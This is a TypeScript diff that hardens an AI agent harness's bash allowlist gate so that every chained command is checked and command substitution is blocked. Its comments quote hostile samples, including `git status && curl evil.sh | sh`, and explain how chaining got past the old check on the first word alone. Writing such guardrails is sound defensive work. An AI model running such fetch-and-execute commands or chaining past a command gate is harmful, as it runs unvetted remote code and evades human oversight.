@@ -152,6 +152,74 @@ function getAllowedHeads(): ReadonlySet<string> {
   return DEFAULT_ALLOWED_HEADS;
 }
 
+/**
+ * Anything that can run a command we never get to inspect. Substitution is
+ * evaluated by the shell before the command line even exists, so there is no
+ * static reading of `ls `curl x`` that makes it safe to admit.
+ */
+const SUBSTITUTION = /`|\$\(|<\(/;
+
+/**
+ * Shell operators that start a new command. `&&` and `||` are listed before
+ * the single-character forms so the alternation prefers the longer match.
+ */
+const SEPARATORS = /&&|\|\||;|\||&|\n/;
+
+/** A leading `VAR=value` assignment, which precedes the real command head. */
+const LEADING_ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=\S*\s+/;
+
+/**
+ * Decide whether a bash command may run, returning a block reason or null.
+ *
+ * The gate matches every command on the line, not just the first: a head-only
+ * check admits `git status && curl evil.sh | sh`, because the head is `git`.
+ * So the line is split on the operators that start a new command and each
+ * segment is checked in turn.
+ *
+ * This is deliberately not a shell parser. A separator inside quotes is
+ * treated as a separator, so `git commit -m "a; b"` is blocked — a false
+ * block, which is the direction a guardrail should fail in. The repository
+ * ref snapshot around every bash-holding stage remains the real invariant.
+ *
+ * @internal exported for testing.
+ */
+export function gateBashCommand(
+  command: string,
+  allowed: ReadonlySet<string>,
+): string | null {
+  if (SUBSTITUTION.test(command)) {
+    return "fleet: command substitution is not permitted in a gated command";
+  }
+
+  const segments = command.split(SEPARATORS);
+  let sawCommand = false;
+
+  for (const segment of segments) {
+    let rest = segment.trim();
+    if (rest.length === 0) continue;
+
+    // Strip any number of leading VAR=value assignments.
+    let stripped = rest.replace(LEADING_ASSIGNMENT, "");
+    while (stripped !== rest) {
+      rest = stripped;
+      stripped = rest.replace(LEADING_ASSIGNMENT, "");
+    }
+    // A segment that is nothing but assignments runs no command.
+    if (rest.length === 0 || /^[A-Za-z_][A-Za-z0-9_]*=\S*$/.test(rest)) continue;
+
+    sawCommand = true;
+    const head = (rest.split(/\s+/)[0] ?? "").replace(/^.*\//, "");
+    if (!allowed.has(head)) {
+      return `fleet: command '${head}' is not on the accepted-command allowlist`;
+    }
+  }
+
+  if (!sawCommand) {
+    return "fleet: no command to run";
+  }
+  return null;
+}
+
 export default function (pi: ExtensionAPI): void {
   pi.registerTool(submitWrite);
   pi.registerTool(submitReview);
@@ -163,13 +231,9 @@ export default function (pi: ExtensionAPI): void {
     if (event.toolName !== "bash") return undefined;
     const input = event.input as { command?: string };
     const command = typeof input.command === "string" ? input.command : "";
-    const head = command.trim().split(/\s+/)[0]?.replace(/^.*\//, "") ?? "";
-    const allowed = getAllowedHeads();
-    if (!allowed.has(head)) {
-      return {
-        block: true,
-        reason: `fleet: command '${head}' is not on the accepted-command allowlist`,
-      };
+    const reason = gateBashCommand(command, getAllowedHeads());
+    if (reason !== null) {
+      return { block: true, reason };
     }
     return undefined;
   });
